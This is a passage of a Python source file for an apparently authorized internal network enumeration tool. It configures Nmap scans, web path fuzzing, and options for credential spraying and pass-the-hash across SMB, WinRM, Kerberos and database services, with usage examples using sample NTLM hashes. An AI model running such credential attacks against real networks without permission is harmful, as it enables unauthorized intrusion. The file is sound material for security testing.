#!/usr/bin/env python3
"""
Bird Scan Internal

Single-file tool for authorized internal network enumeration on Kali Linux.

The default behavior is intentionally conservative: it maps hosts/services,
catalogs web endpoints, runs safe enumeration helpers, and writes a consultive
HTML report plus machine-readable exports. It does not brute-force or exploit
services by default. When username/password lists are supplied, authorized
credential attempts run across auth-capable services using configurable modes
(pitchfork, clusterbomb, single-user, single-pass) while still attempting
anonymous/null access first.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import csv
import datetime as dt
import ftplib
import glob
import hashlib
import html
import ipaddress
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
import urllib.parse
import uuid
import xml.etree.ElementTree as ET
from dataclasses import asdict, dataclass, field
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Iterable


APP_NAME = "Bird Scan Internal"
APP_VERSION = "0.2.0"
DEFAULT_USER_AGENT = "BirdScanInternal/0.1 authorized-internal-enum"
OUTPUT_ROOT = "outputs"
RAW_DIR = "raw"

COMMON_WEB_PATHS = [
    "/",
    "/login",
    "/admin",
    "/administrator",
    "/api",
    "/api/docs",
    "/docs",
    "/doc",
    "/swagger",
    "/swagger-ui",
    "/swagger-ui/",
    "/swagger-ui.html",
    "/openapi.json",
    "/api/openapi.json",
    "/graphql",
    "/graphiql",
    "/actuator",
    "/actuator/health",
    "/health",
    "/metrics",
    "/server-status",
    "/status",
    "/wp-login.php",
    "/phpmyadmin",
]

COMMON_WEB_WORDLIST_CANDIDATES = [
    "/usr/share/dirb/wordlists/common.txt",
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/usr/share/wordlists/dirb/common.txt",
]

WEB_COMMON_LIMITS = {
    "fast": 40,
    "safe": 120,
    "balanced": 250,
    "deep": 900,
}

DASHBOARD_COMMON_WORDLIST = "/usr/share/dirb/wordlists/common.txt"
DASHBOARD_BIG_WORDLIST = "/usr/share/dirb/wordlists/big.txt"
DASHBOARD_SECLISTS_BIG_WORDLIST = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"
DASHBOARD_EXTENSIONS_CSV = "php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql,js,png,jpg,jpeg,config,sh,cfm,zip,log"
DASHBOARD_EXTENSIONS_DOT = ".php,.bkp,.old,.txt,.xml,.cgi,.pdf,.html,.htm,.asp,.aspx,.pl,.sql,.js,.png,.jpg,.jpeg,.config,.zip,.log"
DASHBOARD_EXTENSIONS_SPACE = "php bkp old txt xml cgi pdf html htm asp aspx pl sql js png jpg jpeg config sh cfm zip log"
DEEP_FUZZ_EXTENSIONS_CSV = "bkp,old,txt,xml,sql,js,config,sh,zip,log"
FUZZ_DASHBOARD_TOOLS = ("Gobuster", "Feroxbuster", "Dirsearch")
WEB_MAX_BODY_BYTES = 1048576
DIRSEARCH_MAX_RESULTS_PER_BASE = 200

KERBRUTE_USER_WORDLIST_CANDIDATES = [
    # Maiores wordlists (Brasil / Gerais)
    "/usr/share/wordlists/users-pt-br.txt",
    "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
    "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
    
    # Wordlists médias / Nomes
    "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
    "/usr/share/seclists/Usernames/Names/names.txt",
    "/usr/share/wordlists/dirb/others/names.txt",
    
    # Wordlists menores / Específicas
    "/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt",
    "/usr/share/seclists/Kerberos/A-ZSurnames.txt",
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
]

DEPENDENCIES = [
    "nmap",
    "curl",
    "nxc",
    "crackmapexec",
    "smbclient",
    "rpcclient",
    "mysql",
    "psql",
    "redis-cli",
    "mongosh",
    "host",
    "gowitness",
    "gobuster",
    "feroxbuster",
    "dirsearch",
    "ffuf",
    "dirb",
    "impacket-smbclient",
    "impacket-secretsdump",
    "impacket-mssqlclient",
    "enum4linux",
    "ldapsearch",
    "whatweb",
    "xfreerdp",
    "rdesktop",
    "evil-winrm",
    "lftp",
    "showmount",
    "snmpwalk",
    "swaks",
    "vncviewer",
    "kerbrute",
    "pth-winexe",
    "pth-smbclient",
    "pth-rpcclient",
    "pth-wmic",
    "mount.cifs",
]

# These tools enhance optional enumeration paths but are not required for the
# scanner's core discovery/reporting flow.  They must never trigger a distro-
# specific repository mutation during automatic installation.
OPTIONAL_DEPENDENCIES = {"mongosh"}

DEPENDENCY_PACKAGES = {
    "nmap": "nmap",
    "curl": "curl",
    "nxc": "netexec",
    "crackmapexec": "crackmapexec",
    "smbclient": "smbclient",
    "rpcclient": "samba-common-bin",
    "mysql": "default-mysql-client",
    "psql": "postgresql-client",
    "redis-cli": "redis-tools",
    "mongosh": "mongosh",
    "host": "bind9-host",
    "gowitness": "gowitness",
    "gobuster": "gobuster",
    "feroxbuster": "feroxbuster",
    "dirsearch": "dirsearch",
    "ffuf": "ffuf",
    "dirb": "dirb",
    "impacket-smbclient": "impacket-scripts",
    "impacket-secretsdump": "impacket-scripts",
    "impacket-mssqlclient": "impacket-scripts",
    "enum4linux": "enum4linux",
    "ldapsearch": "ldap-utils",
    "whatweb": "whatweb",
    "xfreerdp": "freerdp2-x11",
    "rdesktop": "rdesktop",
    "evil-winrm": "evil-winrm",
    "lftp": "lftp",
    "showmount": "nfs-common",
    "snmpwalk": "snmp",
    "swaks": "swaks",
    "vncviewer": "tigervnc-viewer",
    "kerbrute": "kerbrute",
    "pth-winexe": "passing-the-hash",
    "pth-smbclient": "passing-the-hash",
    "pth-rpcclient": "passing-the-hash",
    "pth-wmic": "passing-the-hash",
    "mount.cifs": "cifs-utils",
}

SMB_PORTS = {139, 445}
LDAP_PORTS = {389, 636, 3268, 3269}
KERBEROS_PORTS = {88, 464}
RDP_PORTS = {3389}
SSH_PORTS = {22}
FTP_PORTS = {21}
WINRM_PORTS = {5985, 5986}
MYSQL_PORTS = {3306}
POSTGRES_PORTS = {5432}
MSSQL_PORTS = {1433}
NFS_PORTS = {111, 2049}
SNMP_PORTS = {161}
VNC_PORTS = {5900, 5901, 5902}
REDIS_PORTS = {6379}
MONGO_PORTS = {27017, 27018, 27019}
ELASTIC_PORTS = {9200, 9300}
JENKINS_PORTS = {8080, 8081, 8082}
DOCKER_PORTS = {2375, 2376}
K8S_PORTS = {6443, 10250, 10255}
IPMI_PORTS = {623}
TELNET_PORTS = {23}


THREAD_LEVELS = {
    1: {"workers": 2, "timeout": 8, "nmap_timing": "T2", "rate_delay": 0.25},
    2: {"workers": 4, "timeout": 7, "nmap_timing": "T3", "rate_delay": 0.12},
    3: {"workers": 8, "timeout": 6, "nmap_timing": "T3", "rate_delay": 0.05},
    4: {"workers": 12, "timeout": 5, "nmap_timing": "T4", "rate_delay": 0.02},
    5: {"workers": 20, "timeout": 4, "nmap_timing": "T4", "rate_delay": 0.0},
}

PROFILE_DEFAULTS = {
    "safe": {
        "nmap_args": ["-sV", "--version-light", "--open"],
        "nmap_scripts": [],
        "top_ports": "1000",
        "web_fuzz_limit": 14,
    },
    "balanced": {
        "nmap_args": ["-sV", "-sC", "--version-all", "--open"],
        "nmap_scripts": [],
        "top_ports": "2000",
        "web_fuzz_limit": 24,
    },
    "fast": {
        "nmap_args": ["-sV", "--version-light", "--open"],
        "nmap_scripts": [],
        "top_ports": "500",
        "web_fuzz_limit": 8,
    },
    "deep": {
        "nmap_args": ["-sV", "-sC", "-O", "--version-all", "--open"],
        "nmap_scripts": ["vuln"],
        "top_ports": None,
        "web_fuzz_limit": len(COMMON_WEB_PATHS),
    },
}


@dataclass
class CommandResult:
    command: list[str]
    redacted_command: list[str]
    returncode: int
    stdout: str
    stderr: str
    duration: float
    output_file: str | None = None


@dataclass
class HostRecord:
    ip: str
    hostname: str = ""
    fqdn: str = ""
    domain: str = ""
    os_guess: str = ""
    aliases: list[str] = field(default_factory=list)
    tags: list[str] = field(default_factory=list)
    sources: list[str] = field(default_factory=list)


@dataclass
class ServiceRecord:
    ip: str
    port: int
    protocol: str = "tcp"
    service: str = ""
    product: str = ""
    version: str = ""
    banner: str = ""
    state: str = "open"
    source: str = ""


@dataclass
class WebEndpoint:
    url: str
    ip: str
    port: int
    scheme: str
    path: str = "/"
    status_code: int = 0
    title: str = ""
    server: str = ""
    content_type: str = ""
    response_size: int = 0
    content_length: int = 0
    redirect_url: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    technologies: list[str] = field(default_factory=list)
    interesting: bool = False
    finding_reason: str = ""
    raw_headers_file: str = ""
    body_sample_file: str = ""
    screenshot_file: str = ""
    favicon_url: str = ""
    favicon_file: str = ""


@dataclass(frozen=True)
class WebRoot:
    url: str
    ip: str
    port: int
    scheme: str


@dataclass
class Evidence:
    category: str
    ip: str
    port: int | None
    service: str
    title: str
    description: str
    command: str = ""
    raw_output_file: str = ""
    severity: str = "info"
    data: dict[str, Any] = field(default_factory=dict)


@dataclass
class ScanState:
    run_id: str
    started_at: str
    output_dir: str
    targets: list[str] = field(default_factory=list)
    hosts: dict[str, HostRecord] = field(default_factory=dict)
    services: list[ServiceRecord] = field(default_factory=list)
    web_endpoints: list[WebEndpoint] = field(default_factory=list)
    evidence: list[Evidence] = field(default_factory=list)
    dependencies: dict[str, bool] = field(default_factory=dict)
    metadata: dict[str, Any] = field(default_factory=dict)

    def upsert_host(self, ip: str, **kwargs: Any) -> HostRecord:
        if not ip:
            raise ValueError("Cannot upsert host without IP")
        record = self.hosts.get(ip)
        if record is None:
            record = HostRecord(ip=ip)
            self.hosts[ip] = record
        for key, value in kwargs.items():
            if value in (None, "", []):
                continue
            if key == "sources":
                for item in ensure_list(value):
                    if item not in record.sources:
                        record.sources.append(item)
            elif key == "tags":
                for item in ensure_list(value):
                    if item not in record.tags:
                        record.tags.append(item)
            elif key == "aliases":
                for item in ensure_list(value):
                    add_host_alias(record, str(item))
            elif key in {"hostname", "fqdn"}:
                value_text = str(value).strip().strip(".")
                current = getattr(record, key)
                if not current:
                    setattr(record, key, value_text)
                elif current != value_text:
                    add_host_alias(record, value_text)
            elif hasattr(record, key):
                current = getattr(record, key)
                if not current:
                    setattr(record, key, value)
        return record

    def add_service(self, service: ServiceRecord) -> None:
        existing = self.find_service(service.ip, service.port, service.protocol)
        if existing:
            merge_service(existing, service)
            self.upsert_host(service.ip, sources=[service.source or "service"])
            return
        self.services.append(service)
        self.upsert_host(service.ip, sources=[service.source or "service"])

    def find_service(self, ip: str, port: int, protocol: str = "tcp") -> ServiceRecord | None:
        for service in self.services:
            if service.ip == ip and service.port == port and service.protocol == protocol:
                return service
        return None

    def add_evidence(self, evidence: Evidence) -> None:
        for existing in self.evidence:
            if (
                existing.category == evidence.category
                and existing.ip == evidence.ip
                and existing.port == evidence.port
                and existing.service == evidence.service
                and existing.title == evidence.title
                and existing.description == evidence.description
                and existing.raw_output_file == evidence.raw_output_file
            ):
                return
        self.evidence.append(evidence)


class BirdScanError(Exception):
    pass


class BirdScanUsageError(BirdScanError):
    pass


class Logger:
    def __init__(self, verbose: bool = False, quiet: bool = False) -> None:
        self.verbose = verbose
        self.quiet = quiet

    def info(self, message: str) -> None:
        if not self.quiet:
            print(f"[+] {message}")

    def warn(self, message: str) -> None:
        print(f"[!] {message}", file=sys.stderr)

    def debug(self, message: str) -> None:
        if self.verbose and not self.quiet:
            print(f"[*] {message}")

    def stage(self, title: str, detail: str = "") -> None:
        if self.quiet:
            return
        suffix = f" — {detail}" if detail else ""
        print(f"\n[>] {title}{suffix}")


def ensure_list(value: Any) -> list[Any]:
    if isinstance(value, list):
        return value
    if isinstance(value, tuple) or isinstance(value, set):
        return list(value)
    return [value]


def merge_service(existing: ServiceRecord, incoming: ServiceRecord) -> None:
    existing.service = richer_service_name(existing.service, incoming.service, existing.port)
    for field_name in ("product", "version", "banner"):
        setattr(existing, field_name, richer_text_value(getattr(existing, field_name), getattr(incoming, field_name)))
    if incoming.state == "open" and existing.state != "open":
        existing.state = incoming.state
    existing.source = merge_source_text(existing.source, incoming.source)


def richer_service_name(current: str, incoming: str, port: int) -> str:
    current = (current or "").strip()
    incoming = (incoming or "").strip()
    if not incoming:
        return current
    if not current:
        return incoming
    if is_unknown_service_name(incoming):
        return current
    if is_unknown_service_name(current):
        return incoming
    guessed = guess_service_by_port(port).lower()
    if guessed and current.lower() == guessed and incoming.lower() != current.lower():
        return incoming
    return current


def is_unknown_service_name(value: str) -> bool:
    normalized = (value or "").strip().lower()
    return not normalized or normalized in {"unknown", "?", "tcpwrapped"}


def richer_text_value(current: str, incoming: str) -> str:
    current = (current or "").strip()
    incoming = (incoming or "").strip()
    if not incoming:
        return current
    if not current or current.lower() in {"unknown", "?"}:
        return incoming
    if len(incoming) > len(current) and current.lower() in incoming.lower():
        return incoming
    return current


def merge_source_text(current: str, incoming: str) -> str:
    values = dedupe_text(part.strip() for part in re.split(r",\s*", f"{current},{incoming}") if part.strip())
    return ", ".join(values)


def add_host_alias(record: HostRecord, alias: str) -> None:
    alias = alias.strip().strip(".")
    if not alias:
        return
    known = {record.ip, record.hostname, record.fqdn, *record.aliases}
    if alias not in known:
        record.aliases.append(alias)


def now_slug() -> str:
    return dt.datetime.now().strftime("%Y%m%d-%H%M%S")


def safe_filename(value: str, max_len: int = 140) -> str:
    normalized = re.sub(r"[^A-Za-z0-9._-]+", "_", value.strip())
    normalized = normalized.strip("._-")
    if not normalized:
        normalized = "item"
    if len(normalized) > max_len:
        normalized = normalized[:max_len].rstrip("._-")
    return normalized


def relpath(path: Path | str, base: Path | str) -> str:
    try:
        return str(Path(path).resolve().relative_to(Path(base).resolve()))
    except ValueError:
        return str(path)


def redact_command(command: list[str], secrets: Iterable[str] = ()) -> list[str]:
    secret_set = {secret for secret in secrets if secret}
    redacted: list[str] = []
    skip_next_for = {"--password", "--pw", "--hash", "--hashes", "-hashes"}
    previous = ""
    for part in command:
        if previous in skip_next_for:
            redacted.append("***")
        elif part in secret_set:
            redacted.append("***")
        elif any(secret and secret in part for secret in secret_set):
            new_part = part
            for secret in secret_set:
                new_part = new_part.replace(secret, "***")
            redacted.append(new_part)
        else:
            redacted.append(part)
        previous = part
    return redacted


def shell_join(command: list[str]) -> str:
    return " ".join(shlex_quote(part) for part in command)


def shlex_quote(value: str) -> str:
    if re.match(r"^[A-Za-z0-9_@%+=:,./-]+$", value):
        return value
    return "'" + value.replace("'", "'\"'\"'") + "'"


def has_tool(tool: str) -> bool:
    return shutil.which(tool) is not None


def apt_package_has_candidate(package: str) -> bool:
    """Check the existing APT cache without adding or rewriting repositories."""
    if not has_tool("apt-cache"):
        return False
    result = run_command(["apt-cache", "policy", package], timeout=20)
    return bool(re.search(r"^\s*Candidate:\s+(?!\(none\))\S+", result.stdout, flags=re.MULTILINE))


def command_timeout(base_timeout: int, args: argparse.Namespace, multiplier: float = 1.0) -> int:
    return max(1, int(base_timeout * multiplier))


@contextmanager
def private_atomic_text(path: Path):
    """Publish a complete private file without exposing a partially written copy."""
    path.parent.mkdir(parents=True, exist_ok=True)
    fd, name = tempfile.mkstemp(prefix=f".{path.name}-", dir=path.parent)
    temporary = Path(name)
    try:
        with os.fdopen(fd, "w", encoding="utf-8", errors="replace", newline="") as handle:
            yield handle
            handle.flush()
            os.fsync(handle.fileno())
        os.replace(temporary, path)
        if os.name == "posix":
            directory_fd = os.open(path.parent, os.O_RDONLY | os.O_DIRECTORY)
            try:
                os.fsync(directory_fd)
            finally:
                os.close(directory_fd)
    finally:
        temporary.unlink(missing_ok=True)


def private_write_text(path: Path, text: str) -> None:
    with private_atomic_text(path) as handle:
        handle.write(text)


def run_command(
    command: list[str],
    *,
    timeout: int,
    cwd: Path | None = None,
    output_file: Path | None = None,
    logger: Logger | None = None,
    secrets: Iterable[str] = (),
    input_text: str | None = None,
    env: dict[str, str] | None = None,
) -> CommandResult:
    redacted = redact_command(command, secrets=secrets)
    start = time.monotonic()
    if logger:
        logger.debug(f"Running: {shell_join(redacted)}")
    try:
        with subprocess.Popen(
            command,
            cwd=str(cwd) if cwd else None,
            stdin=subprocess.PIPE if input_text is not None else None,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            errors="replace",
            env=env,
            start_new_session=(os.name == "posix"),
        ) as proc:
            try:
                stdout, stderr = proc.communicate(input=input_text, timeout=timeout)
                returncode = proc.returncode
            except (subprocess.TimeoutExpired, KeyboardInterrupt) as exc:
                try:
                    if os.name == "posix":
                        os.killpg(proc.pid, signal.SIGKILL)
                    else:
                        proc.kill()
                except ProcessLookupError:
                    pass
                stdout, stderr = proc.communicate()
                if isinstance(exc, KeyboardInterrupt):
                    raise
                stderr += f"\n[TIMEOUT after {timeout}s]"
                returncode = 124
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout if isinstance(exc.stdout, str) else (exc.stdout or b"").decode(errors="replace")
        stderr = exc.stderr if isinstance(exc.stderr, str) else (exc.stderr or b"").decode(errors="replace")
        stderr += f"\n[TIMEOUT after {timeout}s]"
        returncode = 124
    except OSError as exc:
        stdout = ""
        stderr = f"[EXECUTION ERROR] {exc}"
        returncode = 127
    duration = time.monotonic() - start
    stored_file = None
    if output_file:
        output_file.parent.mkdir(parents=True, exist_ok=True)
        private_write_text(output_file,
            f"$ {shell_join(redacted)}\n\n"
            f"Return code: {returncode}\n"
            f"Duration: {duration:.2f}s\n\n"
            f"--- STDOUT ---\n{stdout}\n\n"
            f"--- STDERR ---\n{stderr}\n",
        )
        stored_file = str(output_file)
    return CommandResult(
        command=command,
        redacted_command=redacted,
        returncode=returncode,
        stdout=stdout,
        stderr=stderr,
        duration=duration,
        output_file=stored_file,
    )


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="Bird-Scan-internal.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent(
            f"""
            {APP_NAME} v{APP_VERSION}

            Authorized internal network enumeration helper for Kali Linux.

            Required input:
              Use at least one of --target, --targets-file, --from-nmap, --from-ip-port, --resume, --check-deps, or --self-test.

            Nmap import:
              --from-nmap accepts XML, gnmap, normal -oN output, directories, or an -oA prefix without extension.
              The parser detects content, not only file extensions.

            Default Nmap discovery:
              sudo nmap --open -Pn -p- -sV -sC -O --version-all --script vuln -oA <prefix> <targets>

            Examples:
              # 1️⃣ Re‑test NTLM hash (partial) – skip discovery phases
              python3 Bird-Scan-internal.py --from-nmap outputs/20260923-114721-2072c9b9/raw/nmap/imported/nmap-sv-local-LAN.nmap --username "john.doe" --ntlm-hash "8846f7ea" --skip-web --skip-service-enum --no-sudo-nmap
              # 2️⃣ Re‑test NTLM full hash (LM+NTLM) – skip discovery phases
              python3 Bird-Scan-internal.py --from-nmap outputs/20260923-114721-2072c9b9/raw/nmap/imported/nmap-sv-local-LAN.nmap --username "john.doe" --ntlm-hash "aad3b435b51404eeaad3b435b51404ee:8846f7ea" --no-sudo-nmap
              # 3️⃣ Full scan with NTLM hash (deep profile, max threads)
              python3 Bird-Scan-internal.py --target 192.168.1.0/24 --profile deep --threads-level 5 --username "john.doe" --ntlm-hash "aad3b435b51404eeaad3b435b51404ee:8846f7ea" --no-sudo-nmap
              # 4️⃣ Full scan with password (deep profile, max threads)
              python3 Bird-Scan-internal.py --target 192.168.1.0/24 --profile deep --threads-level 5 --username "john.doe" --password "S3cr3tP@ss!" --no-sudo-nmap
              # 5️⃣ Import Nmap and test NTLM hash authentication
              python3 Bird-Scan-internal.py --from-nmap nmap-sv-local-LAN --username "john.doe" --ntlm-hash "8846f7ea" --no-sudo-nmap
              # 6️⃣ Import Nmap and test password authentication
              python3 Bird-Scan-internal.py --from-nmap nmap-sv-local-LAN --username "john.doe" --password "S3cr3tP@ss!" --no-sudo-nmap
              python3 Bird-Scan-internal.py --from-nmap scan.xml --skip-nmap
              python3 Bird-Scan-internal.py --from-nmap scan1.nmap scan2.xml --skip-nmap
              python3 Bird-Scan-internal.py --from-nmap 'scans/nmap*' --skip-nmap
              python3 Bird-Scan-internal.py --from-nmap scans/internal-full --output-dir outputs
              python3 Bird-Scan-internal.py --from-ip-port found.txt --web-only
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --ports 80,443,445
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --nmap-extra=--min-rate --nmap-extra=5000
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --nmap-extra=--max-retries --nmap-extra=2
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --udp-top-ports 50
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --deep-fuzz
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --no-sudo-nmap
              python3 Bird-Scan-internal.py --check-deps
              python3 Bird-Scan-internal.py --self-test
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --deep-fuzz
              python3 Bird-Scan-internal.py --target 10.10.10.0/24 --no-sudo-nmap
              python3 Bird-Scan-internal.py --check-deps
              python3 Bird-Scan-internal.py --self-test
            """
        ),
    )
    target_group = parser.add_argument_group("targets")
    target_group.add_argument("--target", "-t", action="append", help="IP, CIDR, hostname, comma-separated list, or an exact Nmap command (e.g. 'sudo nmap -sV -p- -oN scan.nmap 10.0.0.1').")
    target_group.add_argument("--targets-file", help="File with IPs, CIDRs, hostnames, or comma-separated values.")
    target_group.add_argument("--from-nmap", action="append", nargs="+", help="Import one or more Nmap XML, normal, gnmap outputs, directories, prefixes, or glob patterns.")
    target_group.add_argument("--from-ip-port", action="append", help="Import simple IP:PORT or host:port file.")

    scan_group = parser.add_argument_group("scan behavior")
    scan_group.add_argument("--profile", choices=sorted(PROFILE_DEFAULTS), default="deep", help="Operational profile.")
    scan_group.add_argument("--threads-level", type=int, choices=sorted(THREAD_LEVELS), default=5, help="Global aggressiveness 1..5.")
    scan_group.add_argument("--ports", help="Nmap ports, e.g. 80,443,445 or 1-1000. Overrides the profile port scope.")
    scan_group.add_argument("--full-portscan", action="store_true", help="Force -p- during Nmap discovery, overriding safe/fast/balanced profile limits.")
    scan_group.add_argument("--udp-top-ports", type=int, default=0, help="Optional UDP discovery with top N UDP ports. Disabled by default.")
    scan_group.add_argument("--skip-nmap", action="store_true", help="Do not run Nmap; use imported targets/services only.")
    scan_group.add_argument("--web-only", action="store_true", help="Only perform web catalog after importing/running discovery.")
    scan_group.add_argument("--service-enum-only", action="store_true", help="Only perform service enum after importing/running discovery.")
    scan_group.add_argument("--skip-web", action="store_true", help="Skip HTTP/HTTPS probing.")
    scan_group.add_argument("--skip-service-enum", action="store_true", help="Skip SMB/AD/RDP/SSH/FTP/DB/generic service enum.")
    scan_group.add_argument("--map-shares", metavar="PATH", help="Base path to map SMB shares. Default: /tmp/shares, using smb-IP-USER/ per valid identity.")
    scan_group.add_argument("--sudo-nmap", dest="sudo_nmap", action="store_true", default=True, help="Run Nmap through sudo. Default: enabled.")
    scan_group.add_argument("--no-sudo-nmap", dest="sudo_nmap", action="store_false", help="Run Nmap without sudo.")
    scan_group.add_argument("--nmap-extra", action="append", default=[], help="Additional raw Nmap argument. Repeatable. Use --nmap-extra=--flag for values beginning with '-'.")
    scan_group.add_argument("--enable-user-enum", action="store_true", help="Enable explicit user-enumeration checks such as krb5-enum-users.")
    scan_group.add_argument("--kerberos-realm", help="Realm for Kerberos checks, e.g. EXAMPLE.LOCAL.")
    scan_group.add_argument("--user-enum-wordlist", help="User wordlist for optional Kerberos user enum.")

    web_group = parser.add_argument_group("web catalog")
    web_group.add_argument("--user-agent", default=DEFAULT_USER_AGENT, help="Custom User-Agent for web requests.")
    web_group.add_argument("--proxy", help="HTTP/HTTPS proxy for web requests, e.g. http://127.0.0.1:8080.")
    web_group.add_argument("--web-timeout", type=int, help="Override web request timeout in seconds.")
    web_group.add_argument("--web-path", action="append", default=[], help="Extra path to fuzz. Repeatable.")
    web_group.add_argument("--web-wordlist", help="File with extra web paths.")
    web_group.add_argument("--no-web-common-wordlist", action="store_true", help="Do not add the local common web wordlist to light discovery.")
    web_group.add_argument("--web-common-limit", type=int, help="Maximum common wordlist entries to add for light discovery.")
    web_group.add_argument("--web-custom-limit", type=int, help="Maximum --web-wordlist entries to add for light discovery.")
    web_group.add_argument("--web-screenshots", action="store_true", help="Try screenshots with gowitness when available.")
    web_group.add_argument("--no-follow-redirects", action="store_true", help="Do not follow redirects in curl probes.")
    web_group.add_argument("--deep-fuzz", action="store_true", help="Use dirsearch default wordlist with GET and backup/config extensions.")

    auth_group = parser.add_argument_group("optional credentials")
    auth_group.add_argument("--username", "-u", help="Single username for authenticated enumeration.")
    auth_group.add_argument("--password", "-p", help="Single password for authenticated enumeration.")
    auth_group.add_argument("--ntlm-hash", help="Single NTLM hash for authenticated enumeration (e.g. LM:NTLM format like 00000000000000000000000000000000:8846F7EAEE8FB117AD06BDD830B7586C, or just the NTLM part depending on the tool).")
    auth_group.add_argument("--ntlm-hash-file", help="NTLM hash list for authenticated enumeration across auth-capable services.")
    auth_group.add_argument("--username-file", help="Username list for authenticated enumeration across auth-capable services.")
    auth_group.add_argument("--password-file", help="Password list for authenticated enumeration across auth-capable services.")
    auth_group.add_argument(
        "--auth-attack-mode",
        choices=["auto", "pitchfork", "clusterbomb", "single-user", "single-pass"],
        default="pitchfork",
        help=(
            "Credential combination strategy when lists are used: "
            "pitchfork (user1/pass1, user2/pass2), clusterbomb (all user x pass pairs), "
            "single-user (one user with a password list), single-pass (user list with one password). "
            "auto picks based on supplied arguments. Default: pitchfork."
        ),
    )
    auth_group.add_argument("--domain", "-d", help="Domain for authenticated enumeration.")
    auth_group.add_argument("--kerberos", "-k", action="store_true", help="Use Kerberos mode when supported by a tool.")

    output_group = parser.add_argument_group("output")
    output_group.add_argument("--output-dir", default=OUTPUT_ROOT, help="Base output directory.")
    output_group.add_argument("--run-name", help="Optional run directory suffix/name.")
    output_group.add_argument("--resume", help="Resume from a previous output directory containing state.json.")
    output_group.add_argument("--reauth-only", action="store_true", help="Rodar apenas enumeração autenticada em serviços suportados. Requer --resume e credenciais.")
    output_group.add_argument("--check-deps", action="store_true", help="Check external dependencies and exit unless targets are also provided.")
    output_group.add_argument("--no-auto-install", action="store_true", help="Do not try to install missing tools through apt-get.")
    output_group.add_argument("--self-test", action="store_true", help="Run offline parser/report self-test and exit.")
    output_group.add_argument("--verbose", "-v", action="store_true", help="Verbose output.")
    output_group.add_argument("--quiet", "-q", action="store_true", help="Minimal console output.")

    return parser


def parse_args(argv: list[str]) -> argparse.Namespace:
    return build_arg_parser().parse_args(argv)


def has_cli_input(args: argparse.Namespace) -> bool:
    return bool(
        args.target
        or args.targets_file
        or args.from_nmap
        or args.from_ip_port
        or args.resume
        or args.check_deps
        or args.self_test
    )


def flatten_cli_values(values: Any) -> list[str]:
    flattened: list[str] = []
    for value in ensure_list(values or []):
        if isinstance(value, (list, tuple, set)):
            flattened.extend(flatten_cli_values(value))
        elif value:
            flattened.append(str(value))
    return flattened


def nmap_import_values(args: argparse.Namespace) -> list[str]:
    return flatten_cli_values(args.from_nmap)


def validate_required_cli_input(args: argparse.Namespace) -> None:
    if has_cli_input(args):
        return
    raise BirdScanUsageError(
        "Nenhum insumo válido foi informado. Use --target, --targets-file, "
        "--from-nmap, --from-ip-port, --resume, --check-deps ou --self-test."
    )


def validate_cli_file_paths(args: argparse.Namespace) -> None:
    if args.targets_file and not Path(args.targets_file).is_file():
        raise BirdScanUsageError(f"Arquivo de alvos inválido ou inexistente: {args.targets_file}")
    for nmap_file in nmap_import_values(args):
        nmap_paths = resolve_nmap_import_paths(Path(nmap_file))
        if not nmap_paths:
            raise BirdScanUsageError(
                f"Arquivo/prefixo Nmap inválido ou vazio: {nmap_file}. "
                "Informe um output Nmap válido ou um prefixo -oA com .xml/.gnmap/.nmap ao lado."
            )
        if not any(file_has_nmap_markers(path) for path in nmap_paths):
            raise BirdScanUsageError(
                f"Arquivo/prefixo Nmap não parece conter output Nmap válido: {nmap_file}. "
                "Use XML, gnmap ou output normal gerado pelo Nmap."
            )
    for ip_port_file in args.from_ip_port or []:
        path = Path(ip_port_file)
        if not path.is_file() or path.stat().st_size == 0:
            raise BirdScanUsageError(f"Arquivo IP:PORT inválido ou vazio: {ip_port_file}")
        text = path.read_text(encoding="utf-8", errors="replace")
        if not re.search(r"(?:\[([0-9A-Fa-f:]+)\]|([A-Za-z0-9_.-]+)):(\d{1,5})(?:/(tcp|udp))?", text, flags=re.I):
            raise BirdScanUsageError(f"Arquivo IP:PORT não contém entradas válidas no formato IP:PORT: {ip_port_file}")
    if args.resume and not (Path(args.resume) / "state.json").is_file():
        raise BirdScanUsageError(f"Diretório de resume inválido: não encontrei {Path(args.resume) / 'state.json'}")
    if args.reauth_only:
        if not args.resume:
            raise BirdScanUsageError("A opção --reauth-only exige que você informe --resume apontando para um scan anterior.")
        if not (args.username or args.password or getattr(args, "username_file", None) or getattr(args, "password_file", None) or getattr(args, "ntlm_hash", None) or getattr(args, "ntlm_hash_file", None) or getattr(args, "kerberos", None)):
            raise BirdScanUsageError("A opção --reauth-only exige que você forneça credenciais (ex: -u, -p, --ntlm-hash).")
    if args.web_wordlist and not Path(args.web_wordlist).is_file():
        raise BirdScanUsageError(f"Wordlist web inválida ou inexistente: {args.web_wordlist}")
    if args.user_enum_wordlist and not Path(args.user_enum_wordlist).is_file():
        raise BirdScanUsageError(f"Wordlist de usuários inválida ou inexistente: {args.user_enum_wordlist}")
    if getattr(args, "username_file", None) and not Path(args.username_file).is_file():
        raise BirdScanUsageError(f"Lista de usuários inválida ou inexistente: {args.username_file}")
    if getattr(args, "password_file", None) and not Path(args.password_file).is_file():
        raise BirdScanUsageError(f"Lista de senhas inválida ou inexistente: {args.password_file}")
    if getattr(args, "ntlm_hash_file", None) and not Path(args.ntlm_hash_file).is_file():
